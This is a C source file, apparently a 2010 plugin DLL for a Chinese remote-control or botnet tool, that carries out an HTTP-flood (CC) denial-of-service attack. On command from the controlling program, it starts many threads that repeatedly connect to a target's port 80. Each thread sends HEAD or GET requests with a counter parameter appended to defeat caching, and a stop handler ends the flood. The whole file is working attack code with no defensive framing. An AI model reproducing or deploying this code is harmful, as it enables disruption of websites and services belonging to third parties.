/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "main.h"
#include <stdio.h>
#include <process.h>

pshare_main g_share_main = NULL;
ptask_list g_task_list;

ptask_list task_list_find(pddos_task pd_task)
{
    ptask_list ptmp_list = g_task_list;
    while (ptmp_list) {
        if (strcmp(ptmp_list->d_task.addr, pd_task->addr) == 0)
            return ptmp_list;
        ptmp_list = ptmp_list->next;
    }
    return NULL;
}

int task_list_add(ptask_list ptask)
{
    ptask_list ptmp_list = g_task_list;
    if (g_task_list == NULL) {
        g_task_list = ptask;
    } else {
        while (ptmp_list->next != NULL)
            ptmp_list = ptmp_list->next;
        ptmp_list->next = ptask;
    }
    return 0;
}

int task_list_del(ptask_list ptask)
{
    ptask_list ptmp_list = g_task_list;
    if (g_task_list == ptask)
        g_task_list = g_task_list->next;
    else {
        while (ptmp_list->next != ptask) {
            if (ptmp_list->next == NULL)
                break;
            ptmp_list = ptmp_list->next;
        }
        if (ptmp_list->next == ptask) {
            ptmp_list->next = ptask->next;
        }
    }
    return 0;
}

unsigned long str_ip_to_long(char * ip)
{
    unsigned long   rip     = 0;
    struct hostent  *host   = NULL;
    host = gethostbyname(ip);
    if(host != NULL) {
        memcpy(&rip,host->h_addr_list[0],host->h_length);
    } else {
        rip = inet_addr(ip);
    }
    return rip;
}

unsigned __stdcall _no_cache_cc(void *param)
{
    ptask_list ptask = (ptask_list)param;
    char s_buf[4096];
    char r_buf[1024];
    int s_len;
    u_long /*ul = 1,*/ num = 1;
    SOCKET sock;

    for (;;) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET)
            return -1;
        if (connect(sock, (struct sockaddr* far)&ptask->client_in, sizeof(struct sockaddr_in)) != SOCKET_ERROR) {
            //ioctlsocket(sock, FIONBIO, (u_long*)&ul);
            for (;;) {
                //printf("%d\n", sock);
                sprintf(s_buf, ptask->s_buf, "&km_check=", num ++);
                s_len = send(sock, s_buf, strlen(s_buf), 0);
                //printf("%d:%d:%d\n%s\n\n", sock, s_len, ptask->s_len, s_buf);
                if (s_len < 1)
                    break;
                memset(r_buf, 0x0, 1024);
                s_len = recv(sock, r_buf, 1024, 0);

                if (ptask->status == 1) {
                    //printf("ptask->status == 1\n");
                    goto _exit;
                }
                if (strstr(r_buf, "200") == NULL) {
                    //printf("%d:200 == NULL\n%s\n\n", s_len, r_buf);
                    break;
                }
            }
            closesocket(sock);
        }
        //Sleep(1);
        if (ptask->status == 1)
            goto _exit;
    }

_exit:
    closesocket(sock);
    return 0;
}

int _no_cache_cc_start(pddos_task p_task)
{
    char host[1024]={0}, *find;
    char addr[4096]={0};
    int i =0;

    ptask_list pt_list = malloc(sizeof(task_list));
    memset(pt_list, 0x0, sizeof(task_list));

    memcpy(&pt_list->d_task, p_task, sizeof(ddos_task));

    find = strstr(p_task->addr, "/");
    if (find == NULL)
        goto _error_exit;

    strcpy(addr, find);
    memcpy(host, p_task->addr, find - p_task->addr);

    if (p_task->type == 0) {
        sprintf(pt_list->s_buf, "HEAD %s%%s%%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nKeep-Alive: 300\r\n\r\n",
            addr, host);
    } else if (p_task->type == 1) {
        sprintf(pt_list->s_buf, "GET %s%%s%%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nKeep-Alive: 300\r\n\r\n",
            addr, host);
    }

    pt_list->s_len = strlen(pt_list->s_buf);

    pt_list->client_in.sin_family = AF_INET;
    pt_list->client_in.sin_port = htons(80);
    pt_list->client_in.sin_addr.s_addr = str_ip_to_long(host);

    pt_list->phandle = (HANDLE*)malloc(p_task->thread * sizeof(HANDLE));

    for (i=0; i<p_task->thread; i++) {
        pt_list->phandle[i] = (HANDLE)_beginthreadex(NULL, 0, _no_cache_cc, pt_list, 0, 0);
    }

    task_list_add(pt_list);
    printf("_no_cache_cc_start %d\n", pt_list->s_len);
    return 1;
_error_exit:
    if (pt_list != NULL)
        if (pt_list->phandle != NULL)
            free(pt_list->phandle);
        free(pt_list);
    return 0;
}

unsigned __stdcall _no_cache_cc_stop(void* param)
{
    int i = 0;
    pddos_task p_task = (pddos_task)param;
    ptask_list pt_list = task_list_find((pddos_task)p_task);
    if (pt_list == NULL)
        return 0;

    task_list_del(pt_list);

    pt_list->status = 1;

    /*for (i=0; i<p_task->thread; i++) {
        TerminateThread(pt_list->phandle[i], -1);
        CloseHandle(pt_list->phandle[i]);
    }*/
    WaitForMultipleObjects(p_task->thread, pt_list->phandle, TRUE, INFINITE);
    for (i=0; i<p_task->thread; i++) {
        //TerminateThread(pt_list->phandle[i], -1);
        CloseHandle(pt_list->phandle[i]);
    }
    if (pt_list != NULL) {
        if (pt_list->phandle != NULL)
            free(pt_list->phandle);
        free(pt_list);
    }
    printf("_no_cache_cc_stop\n");
    return 0;
}

int
kms_main_ddos_task_start(pio_socket i_socket, char *buffer, int length)
{
    //pio_data_header pi_data_header = (pio_data_header)buffer;
    printf("%s\n", "kms_main_ddos_task_start");
    _no_cache_cc_start((pddos_task)(buffer + sizeof(io_data_header)));
    /*if (!k_sock_ret_connect(g_share_main->remote_addr, pi_data_header->crc32, km_cmd_connect)) {
        printf("%s\n", "k_sock_ret_connect error");
    }*/
    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_ddos_task_stop(pio_socket i_socket, char *buffer, int length)
{
    //pio_data_header pi_data_header = (pio_data_header)buffer;
    printf("%s\n", "kms_main_ddos_task_stop");
    CloseHandle((HANDLE)_beginthreadex(NULL, 0, _no_cache_cc_stop, (pddos_task)(buffer + sizeof(io_data_header)), 0, 0));
     Sleep(1);
    return SOCK_LOOP_RECV_HEADER;
}

kms_event_func event_funcs[] = {
    kms_main_ddos_task_start,
    kms_main_ddos_task_stop
};

int __declspec(dllexport) initialize(pshare_main ps_main)
{
    g_share_main = ps_main;
    g_share_main->event_funcs[6].event_funcs = event_funcs;
    g_share_main->event_funcs[6].count = 2;
    return 0;
}
